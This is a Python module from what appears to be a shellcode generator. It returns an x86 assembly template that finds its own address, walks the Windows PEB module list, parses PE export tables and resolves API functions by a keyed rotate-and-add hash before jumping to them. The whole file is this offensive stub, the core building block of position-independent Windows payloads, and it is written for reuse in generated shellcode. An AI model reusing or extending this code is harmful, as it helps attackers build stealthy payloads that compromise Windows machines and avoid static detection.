from coder.util import DEFAULT_HASH_KEY


def generate(key=DEFAULT_HASH_KEY):
    return f"""
    find_and_call_shorten:
        jmp find_and_call_shorten_bnc   // Short jump

    find_and_call_ret:
        pop esi                         // POP the return address from the stack
        mov   [ebp+0x4], esi            // Save find_function address for later usage
        jmp find_and_call_hop

    find_and_call_shorten_bnc:
        call find_and_call_ret          // Relative CALL with negative offset

    find_and_call:
        pushad                          // Save all registers
        xor   ecx, ecx                  // ECX = 0
        mov   esi,fs:[ecx+0x30]         // ESI = &(PEB) ([FS:0x30])
        mov   esi,[esi+0x0C]            // ESI = PEB->Ldr
        mov   esi,[esi+0x1C]            // ESI = PEB->Ldr.InInitOrder

    next_module:
        push  esi                       // Save InInitOrder for next module
        mov   ebx, [esi+0x08]           // EBX = InInitOrder[X].base_address
        movzx eax, byte ptr [esi+0x1e]  // EAX = InInitOrder[X].module_name_length
        mov   [ebp-0x8], eax            // Save ModuleNameLength for later

    find_function:
        mov   eax, [ebx+0x3C]           // Offset to PE Signature
        mov   edi, [ebx+eax+0x78]       // Export Table Directory RVA
        add   edi, ebx                  // Export Table Directory VMA
        mov   ecx, [edi+0x18]           // NumberOfNames
        mov   eax, [edi+0x20]           // AddressOfNames RVA
        add   eax, ebx                  // AddressOfNames VMA
        mov   [ebp-0x4], eax            // Save AddressOfNames VMA for later

    find_function_loop:
        jecxz get_next_module           // Jump to the end if ECX is 0
        dec   ecx                       // Decrement our names counter
        mov   eax, [ebp-0x4]            // Restore AddressOfNames VMA
        mov   esi, [eax+ecx*0x4]        // Get the RVA of the symbol name
        add   esi, ebx                  // Set ESI to the VMA of the current symbol name

    compute_hash:
        xor   eax, eax                  // EAX = 0
        mov   edx, [ebp-0x8]            // EDX = ModuleNameLength 
        cld                             // Clear direction

    compute_hash_again:
        lodsb                           // Load the next byte from esi into al
        test  al, al                    // Check for NULL terminator
        jz    find_function_compare     // If the ZF is set, we've hit the NULL term
        ror   edx, {hex(key)}           // Rotate edx key bits to the right
        add   edx, eax                  // Add the new byte to the accumulator
        jmp   compute_hash_again        // Next iteration

    find_and_call_hop:
        jmp   find_and_call_end

    get_next_module:
        pop   esi                       // Restore InInitOrder
        mov   esi, [esi]                // ESI = InInitOrder[X].flink (next)
        jmp   next_module

    find_function_compare:
        cmp   edx, [esp+0x28]           // Compare the computed hash with the requested hash
        jnz   find_function_loop        // If it doesn't match go back to find_function_loop
        mov   edx, [edi+0x24]           // AddressOfNameOrdinals RVA
        add   edx, ebx                  // AddressOfNameOrdinals VMA
        mov   cx,  [edx+2*ecx]          // Extrapolate the function's ordinal
        mov   edx, [edi+0x1c]           // AddressOfFunctions RVA
        add   edx, ebx                  // AddressOfFunctions VMA
        mov   eax, [edx+4*ecx]          // Get the function RVA
        add   eax, ebx                  // Get the function VMA
        mov   [esp+0x20], eax           // Overwrite stack version of eax from pushad

    call_function:
        pop   esi                       // Remove InInitOrder
        popad                           // Restore registers
        pop   ecx                       // Escape return address
        pop   edx                       // Remove hash
        push  ecx                       // Set return address
        jmp   eax                       // Call found function

    find_and_call_end:
    """
